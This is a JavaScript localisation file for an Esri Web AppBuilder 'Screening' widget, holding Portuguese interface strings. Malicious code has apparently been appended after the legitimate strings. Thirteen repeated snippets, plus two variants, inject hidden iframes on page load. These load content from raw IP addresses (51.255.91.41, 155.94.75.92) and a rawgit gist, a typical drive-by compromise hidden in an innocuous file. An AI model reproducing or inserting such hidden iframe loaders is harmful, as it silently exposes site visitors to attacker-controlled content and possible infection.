// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.

define({"widgets/Screening/nls/strings":{_widgetLabel:"Exibi\u00e7\u00e3o",geometryServicesNotFound:"Servi\u00e7o de geometria n\u00e3o dispon\u00edvel.",unableToDrawBuffer:"N\u00e3o foi poss\u00edvel desenhar o buffer. Tente novamente.",invalidConfiguration:"Configura\u00e7\u00e3o inv\u00e1lida.",clearAOIButtonLabel:"Come\u00e7ar Novamente",noGraphicsShapefile:"O shapefile transferido n\u00e3o cont\u00e9m nenhum gr\u00e1fico.",zoomToLocationTooltipText:"Zoom na localiza\u00e7\u00e3o",noGraphicsToZoomMessage:"Nenhum Gr\u00e1fico localizado para ampliar.",
placenameWidget:{placenameLabel:"Procurar um local"},drawToolWidget:{useDrawToolForAOILabel:"Selecionar modo de desenho",toggleSelectability:"Clique para alternar a op\u00e7\u00e3o de sele\u00e7\u00e3o",chooseLayerTitle:"Escolha a camada selecion\u00e1vel",selectAllLayersText:"Selecionar Tudo",layerSelectionWarningTooltip:"Pelo menos uma camada deve ser selecionada para criar AOI"},shapefileWidget:{shapefileLabel:"Transfira um shapefile compactado",uploadShapefileButtonText:"Carregar",unableToUploadShapefileMessage:"N\u00e3o \u00e9 poss\u00edvel transferir o Shapefile."},
coordinatesWidget:{selectStartPointFromSearchText:"Defina um ponto inicial",addButtonTitle:"Adicionar",deleteButtonTitle:"Remover",mapTooltipForStartPoint:"Clique no mapa para definir um ponto inicial",mapTooltipForUpdateStartPoint:"Clique no mapa para atualizar o ponto inicial",locateText:"Localizar",locateByMapClickText:"Selecione as coordenadas inicial",enterBearingAndDistanceLabel:"Insira os valores de dire\u00e7\u00e3o e dist\u00e2ncia do ponto inicial",bearingTitle:"Dire\u00e7\u00e3o",distanceTitle:"Dist\u00e2ncia",
planSettingTooltip:"Configura\u00e7\u00f5es de Plano",invalidLatLongMessage:"Insira valores v\u00e1lidos."},bufferDistanceAndUnit:{bufferInputTitle:"Dist\u00e2ncia de buffer (opcional)",bufferInputLabel:"Mostrar os resultados dentro de"},traverseSettings:{bearingLabel:"Dire\u00e7\u00e3o",lengthLabel:"Comprimento",addButtonTitle:"Adicionar",deleteButtonTitle:"Remover"},planSettings:{expandGridTooltipText:"Expandir grade",collapseGridTooltipText:"Recolher grade",directionUnitLabelText:"Unidade de Dire\u00e7\u00f5es",
distanceUnitLabelText:"Unidades de Comprimento e Dist\u00e2ncia",planSettingsComingSoonText:"Em Breve"},newTraverse:{invalidBearingMessage:"Dire\u00e7\u00e3o inv\u00e1lida.",invalidLengthMessage:"Comprimento Inv\u00e1lido.",negativeLengthMessage:"Comprimento Negativo"},reportsTab:{aoiAreaText:"\u00c1rea AOI",downloadButtonTooltip:"Download",printButtonTooltip:"Imprimir",uploadShapefileForAnalysisText:"Transferir Shapefile para incluir na an\u00e1lise",uploadShapefileForButtonText:"Procurar",downloadLabelText:"Selecionar Formato :",
downloadBtnText:"Download",noDetailsAvailableText:"Nenhum resultado encontrado",featureCountText:"Contagem",featureAreaText:"\u00c1rea",featureLengthText:"Comprimento",attributeChooserTooltip:"Escolher atributos para exibir",csv:"CSV",filegdb:"Arquivo Geodatabase",shapefile:"Shapefile",noFeaturesFound:"Nenhum resultado localizado para formato de arquivo selecionado",selectReportFieldTitle:"Selecionar campos",noFieldsSelected:"Nenhum campo selecionado",intersectingFeatureExceedsMsgOnCompletion:"A contagem de registro m\u00e1xima alcan\u00e7ou uma ou mais camadas.",
unableToAnalyzeText:"N\u00e3o \u00e9 poss\u00edvel analisar, a contagem de registro m\u00e1xima foi alcan\u00e7ada.",errorInPrintingReport:"N\u00e3o \u00e9 poss\u00edvel imprimir o relat\u00f3rio. Verifique se as configura\u00e7\u00f5es de relat\u00f3rio s\u00e3o v\u00e1lidas.",aoiInformationTitle:"Informa\u00e7\u00f5es de \u00c1rea de Interesse (AOI)",summaryReportTitle:"Resumo",notApplicableText:"N\u00e3o Aplic\u00e1vel",downloadReportConfirmTitle:"Confirmar download",downloadReportConfirmMessage:"Tem certeza que deseja baixar?",
noDataText:"Sem Dados",createReplicaFailedMessage:"Falha na opera\u00e7\u00e3o de download das camadas seguintes: \x3cbr/\x3e ${layerNames}",extractDataTaskFailedMessage:"Falha na opera\u00e7\u00e3o de download.",printLayoutLabelText:"Layout",printBtnText:"Imprimir",printDialogHint:"Anota\u00e7\u00e3o: O t\u00edtulo de relat\u00f3rio e coment\u00e1rios podem ser editados na visualiza\u00e7\u00e3o do relat\u00f3rio.",unableToDownloadFileGDBText:"Arquivo Geodatabase n\u00e3o pode ser baixado para AOI contendo locais de ponto ou de linha",
unableToDownloadShapefileText:"Shapefile n\u00e3o pode ser baixado para AOI contendo locais de ponto ou de linha",analysisUnitLabelText:"Mostrar resultados em:",analysisUnitButtonTooltip:"Escolha unidades para an\u00e1lise",analysisCloseBtnText:"Fechar",feetUnit:"P\u00e9s / P\u00e9s Quadrados",milesUnit:"Milhas / Acres",metersUnit:"Metros / Metros Quadrados",kilometersUnit:"Quil\u00f4metros / Quil\u00f4metros Quadrados",hectaresUnit:"Quil\u00f4metros / Hectares",hectaresAbbr:"hectares",layerNotVisibleText:"N\u00e3o foi poss\u00edvel analisar, a camada est\u00e1 desativada ou fora de escala do intervalo de visibilidade.",
refreshBtnTooltip:"Atualizar relat\u00f3rio"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});